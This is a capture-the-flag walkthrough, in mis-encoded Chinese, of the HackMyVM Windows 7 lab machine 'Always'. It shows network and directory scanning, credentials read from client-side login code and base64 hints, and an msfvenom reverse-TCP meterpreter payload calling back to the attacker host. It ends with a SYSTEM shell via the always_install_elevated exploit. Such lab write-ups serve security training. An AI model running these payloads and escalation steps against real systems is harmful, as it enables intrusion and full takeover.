---
{"created":"2024-11-25T22:39:30.276+08:00","tags":["HMV","å‰ç«¯ç™»å½•éªŒè¯"],"Type":"wp","dg-publish":true,"éš¾åº¦":"â­ï¸â­ï¸â­ï¸","ä½œè€…":"ysnmrtksk","aliases":null,"ç³»ç»Ÿ":"Windows","permalink":"/24-æ¸—é€/HMV/29.Always/","dgPassFrontmatter":true,"noteIcon":"2"}
---

## 1. åŸºæœ¬ä¿¡æ¯^toc

- [[24-æ¸—é€/HMV/29.Always#1. åŸºæœ¬ä¿¡æ¯^toc\|1. åŸºæœ¬ä¿¡æ¯]]
- [[24-æ¸—é€/HMV/29.Always#2. ä¿¡æ¯æ”¶é›†\|2. ä¿¡æ¯æ”¶é›†]]
	- [[24-æ¸—é€/HMV/29.Always#2.1. ç½‘ç«™ä¸»é¡µ\|2.1. ç½‘ç«™ä¸»é¡µ]]
	- [[24-æ¸—é€/HMV/29.Always#2.2. ç›®å½•æ‰«æ\|2.2. ç›®å½•æ‰«æ]]
	- [[24-æ¸—é€/HMV/29.Always#2.3. ç½‘ç«™åå°\|2.3. ç½‘ç«™åå°]]
- [[24-æ¸—é€/HMV/29.Always#3. SMB\|3. SMB]]
	- [[24-æ¸—é€/HMV/29.Always#3.1. SMBç©ºä¼šè¯æ£€æµ‹\|3.1. SMBç©ºä¼šè¯æ£€æµ‹]]
- [[24-æ¸—é€/HMV/29.Always#4. FTP\|4. FTP]]
- [[24-æ¸—é€/HMV/29.Always#5. ç½‘å€åå°\|5. ç½‘å€åå°]]
	- [[24-æ¸—é€/HMV/29.Always#5.1. å‰æ®µéªŒè¯å¯†ç \|5.1. å‰æ®µéªŒè¯å¯†ç ]]
- [[24-æ¸—é€/HMV/29.Always#6. ftpç™»å½•\|6. ftpç™»å½•]]
		- [[24-æ¸—é€/HMV/29.Always#6.1.1. ç®¡ç†å‘˜çš„æç¤º\|6.1.1. ç®¡ç†å‘˜çš„æç¤º]]
- [[24-æ¸—é€/HMV/29.Always#7. ftpç”¨æˆ·ç™»å½•\|7. ftpç”¨æˆ·ç™»å½•]]
**é¶æœºé“¾æ¥** https://hackmyvm.eu/machines/machine.php?vm=Always
**ä½œè€…** ysnmrtksk
**éš¾åº¦** â­ï¸â­ï¸â­ï¸

## 2. ä¿¡æ¯æ”¶é›†

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# fping -aqg 192.168.56.0/24
192.168.56.2
192.168.56.6
192.168.56.19

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# fscan -h 192.168.56.19

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.19:445 open
192.168.56.19:139 open
192.168.56.19:135 open
192.168.56.19:21 open
192.168.56.19:8080 open
[*] alive ports len is: 5
start vulscan
[*] NetInfo
[*]192.168.56.19
   [->]Always-PC
   [->]192.168.56.19
[*] OsInfo 192.168.56.19        (Windows 7 Professional 7601 Service Pack 1)
[*] WebTitle http://192.168.56.19:8080 code:200 len:178    title:We Are Sorry
å·²å®Œæˆ 5/5
[*] æ‰«æç»“æŸ,è€—æ—¶: 2.252398436s

```
### 2.1. ç½‘ç«™ä¸»é¡µ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# curl http://192.168.56.19:8080
<DOCTYPE html>
<head>
        <title>We Are Sorry</title>
</head>
<body>
        <center><h1>Our Site Is Under Maintenance. Please Come Back Again Later.</h1></center>
</body>
</html>
```

æç¤ºç½‘ç«™æ­£åœ¨ç»´æŠ¤ï¼Œè¿‡ä¼šå†æ¥

### 2.2. ç›®å½•æ‰«æ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# dirsearch -u http://192.168.56.19:8080

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/Awayls/reports/http_192.168.56.19_8080/_24-11-25_22-45-05.txt

Target: http://192.168.56.19:8080/

[22:45:08] 301 -  240B  - /ADMIN  ->  http://192.168.56.19:8080/ADMIN/
[22:45:08] 301 -  240B  - /Admin  ->  http://192.168.56.19:8080/Admin/
[22:45:08] 200 -    3KB - /admin%20/
[22:45:08] 301 -  240B  - /admin  ->  http://192.168.56.19:8080/admin/
[22:45:08] 301 -  241B  - /admin.  ->  http://192.168.56.19:8080/admin./
[22:45:09] 200 -    3KB - /Admin/
[22:45:09] 200 -    3KB - /admin/
[22:45:09] 200 -    3KB - /admin/index.html
[22:45:12] 403 -  199B  - /cgi-bin/
[22:45:12] 500 -  530B  - /cgi-bin/printenv.pl
[22:45:16] 403 -  199B  - /index.php::$DATA
[22:45:24] 403 -  199B  - /Trace.axd::$DATA
[22:45:26] 403 -  199B  - /web.config::$DATA

```

### 2.3. ç½‘ç«™åå°
![](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125224659.png)
å°è¯•ä¸€ä¸‹ç®€å•çš„å¼±å£ä»¤
æ²¡æœ‰ç™»å½•æˆåŠŸã€‚å¹¶ä¸”è¿™é‡Œæˆ‘ä»¬ä¸èƒ½æ ¹æ®å›æ˜¾åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨ã€‚
å…ˆçœ‹ä¸‹SMB SMBèµ°ä¸é€šåœ¨å›æ¥çœ‹è¿™ä¸ªç½‘ç«™å°è¯•çˆ†ç ´

## 3. SMB

### 3.1. SMBç©ºä¼šè¯æ£€æµ‹
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# smbmap -u anonymous -H 192.168.56.19

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)

```
ä¸å­˜åœ¨ç©ºä¼šè¯ç”¨æˆ·
å› ä¸ºè¿™é‡Œæ²¡æœ‰åŸŸï¼Œä¹Ÿæ²¡æœ‰å¼€æ”¾88ç«¯å£ï¼ˆKerberosçš„ç«¯å£ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¸èƒ½å°è¯•è¿›è¡Œkerbruteçˆ†ç ´

## 4. FTP
æ£€æµ‹ä¸€ä¸‹ftpæ˜¯å¦å­˜åœ¨åŒ¿åç™»å½•
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# ftp 192.168.56.19
Connected to 192.168.56.19.
220 Microsoft FTP Service
Name (192.168.56.19:root): anonymous
331 Password required for anonymous.
Password:
530 User cannot log in.
ftp: Login failed

```
ä¹Ÿä¸å­˜åœ¨ftpåŒ¿åç™»å½•
é‚£çœ‹æ¥åªèƒ½å¹²ç½‘ç«™äº†
## 5. ç½‘å€åå°
### 5.1. å‰æ®µéªŒè¯å¯†ç 
å°è¯•æŠ“åŒ…çˆ†ç ´æ—¶å‘ç° ç‚¹äº†LoginæŠ“ä¸åˆ°åŒ…
![](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125230241.png)
è¯´æ˜è¿™é‡Œæ˜¯å‰æ®µéªŒè¯

ç›´æ¥çœ‹ä»£ç 
![](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125230328.png)
è·å–åˆ°ç”¨æˆ·ä¸å¯†ç 
```
adminï¼šadminpass123
```
æˆåŠŸç™»å½•åå°

è¿›æ¥åè·å–åˆ°äº†ä¸€ä¸ªæç¤º
![](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125230433.png)
```
ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=
```
è§£å¯†
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# echo 'ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=' |base64 -d
ftpuser:KeepGoingBro!!!    
```
## 6. ftpç™»å½•
åˆ©ç”¨ç»™çš„ftpè´¦å·å¯†ç ç™»å½•
`ftpuser:KeepGoingBro!!! `
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# ftp 192.168.56.19
Connected to 192.168.56.19.
220 Microsoft FTP Service
Name (192.168.56.19:root): ftpuser
331 Password required for ftpuser.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -a
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
10-01-24  07:17PM                   56 robots.txt
226 Transfer complete.
ftp> get robots.txt
local: robots.txt remote: robots.txt
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
100% |****************************************************|    56      314.29 KiB/s    00:00 ETA
226 Transfer complete.
56 bytes received in 00:00 (103.57 KiB/s)
ftp> exit
221 Goodbye.

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# cat robots.txt
User-agent: *
Disallow: /admins-secret-pagexxx.html

```
è·å–åˆ°ä¸€ä¸ªè·¯å¾„ `/admins-secret-pagexxx.html`

#### 6.1.1. ç®¡ç†å‘˜çš„æç¤º
è®¿é—®è·å–åˆ°ç®¡ç†å‘˜çš„æç¤º 
```
 ## Admin's Secret Notes

- 1) Disable the firewall and Windows Defender.
- 2) Enable FTP and SSH.
- 3) Start the Apache server.
- 4) Don't forget to change the password for user 'always'. Current password is "WW91Q2FudEZpbmRNZS4hLiE=".
```

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# echo 'WW91Q2FudEZpbmRNZS4hLiE=' |base64 -d
YouCantFindMe.!.!  
```
æ ¹æ®ç¬¬å››æ¡æç¤ºå¯ä»¥çŸ¥é“
> ç”¨æˆ· always
å¯†ç  YouCantFindMe.!.!

å°è¯•åˆ©ç”¨winrmç™»å½•
å‘ç°ç™»ä¸è¿›å»ã€åŸæ¥è§£ç åçš„ä¸æ˜¯å¯†ç ã€‚è€Œæ˜¯æç¤ºğŸ˜…

é‚£å°±æ‰¾ä¸€ä¸‹å¯†ç å§
## 7. ftpç”¨æˆ·ç™»å½•
æ‰¾äº†åŠå¤©æ²¡æœ‰æ‰¾åˆ°ï¼Œçœ‹wpåŸæ¥è¦ç›´æ¥ä»vboxç™»å½•`Ftpuser`ç”¨æˆ·
æˆ‘å…¶å®æœ‰æµ‹è¯•è¿‡winrmç™»å½•è¿™ä¸ªç”¨æˆ·
ä½†æ˜¯å¤±è´¥äº†ã€‚æˆ‘æ˜¯æ²¡æƒ³åˆ°åŸæ¥è¦ä»Vboxç™»å½•çš„ã€‚ æœç„¶æ˜¯é¶æœºå•Šã€‚å®æˆ˜å“ªé‡Œæœ‰äººæŠŠç”µè„‘æ‹¿è¿‡æ¥ç»™ä½ ç™»å•ŠğŸ˜…

è¿›æ¥åæŠŠå±å¹•é”®ç›˜ç‚¹å‡ºæ¥ï¼Œä¸ç„¶ä½ ä¼šè¢«æ¶å¿ƒæ­»çš„ğŸ¤®
è®°å¾—æŠŠå·¦ä¸Šè§’åˆ‡æ¢æˆEN
![assets/Pasted image 20241224205846.png](/img/user/24-%E6%B8%97%E9%80%8F/HMV/assets/Pasted%20image%2020241224205846.png)

åˆ©ç”¨å¯†ç  `KeepGoingBro!!!` è¿›å»ï¼Œåææƒå°±è¡Œäº†


ææƒå¾ˆç®€å•ã€‚æˆ‘æ€è·¯æ˜¯ç›´æ¥ä¼ ä¸€ä¸ªcsåé—¨ï¼Œç„¶åç›´æ¥æå°±è¡Œäº†ã€‚
![assets/Pasted image 20241224210216.png](/img/user/24-%E6%B8%97%E9%80%8F/HMV/assets/Pasted%20image%2020241224210216.png)

ç”Ÿæˆmsfåé—¨ä¸Šä¼  ä¸Šå»ç„¶åè¿è¡Œä¸Šçº¿msf
```bash
ç”Ÿæˆåé—¨
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.6 lport=7788 -f exe > msf7788.exe

å¼€å¯ç›‘å¬
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.56.6
set lport 7788
run

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.56.6:7788
[*] Sending stage (176198 bytes) to 192.168.56.25
[*] Meterpreter session 1 opened (192.168.56.6:7788 -> 192.168.56.25:54117) at 2024-12-24 08:10:03 -0500

meterpreter >
```

ç„¶ååˆ©ç”¨ `local_exploit_suggester` æ¨¡å— è¿›è¡Œæ£€æµ‹ææƒæ¼æ´
```bash
background å›åˆ°åå°
user post/multi/recon/local_exploit_suggester
set session 1
run

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] fe80::c471:5b9c:b92e:7e8a - Collecting local exploits for x86/windows...
[*] fe80::c471:5b9c:b92e:7e8a - 193 exploit checks are being tried...
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] fe80::c471:5b9c:b92e:7e8a - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] fe80::c471:5b9c:b92e:7e8a - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.

```

è¿™é‡Œæˆ‘ä»¬å°±ä½¿ç”¨æ¨èçš„ç¬¬ä¸€ä¸ªæ¨¡å— `exploit/windows/local/always_install_elevated`
```bash
msf6 exploit(windows/local/always_install_elevated) > use exploit/windows/local/always_install_elevated
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > show options

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.8.96     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/always_install_elevated) > set lhost 192.168.56.6
lhost => 192.168.56.6
msf6 exploit(windows/local/always_install_elevated) > set lport 7788
lport => 7788
msf6 exploit(windows/local/always_install_elevated) > set session 1
session => 1
msf6 exploit(windows/local/always_install_elevated) > run

[*] Started reverse TCP handler on 192.168.56.6:7788
[*] Uploading the MSI to C:\Users\ftpuser\AppData\Local\Temp\VEPgFpavVN.msi ...
[*] Executing MSI...
[*] Sending stage (176198 bytes) to 192.168.56.25
[+] Deleted C:\Users\ftpuser\AppData\Local\Temp\VEPgFpavVN.msi
[*] Meterpreter session 2 opened (192.168.56.6:7788 -> 192.168.56.25:54480) at 2024-12-24 08:16:38 -0500

meterpreter > shell
Process 1976 created.
Channel 2 created.
Microsoft Windows [Sâ–’râ–’m 6.1.7601]
Telif Hakkâ–’ (c) 2009 Microsoft Corporation. Tâ–’m haklarâ–’ saklâ–’dâ–’r.

C:\Windows\system32>whoami
whoami
nt authority\system

```

æœ€åæ˜¯flag
```
HMV{You_Found_Me!}
```

```
HMV{White_Flag_Raised}
```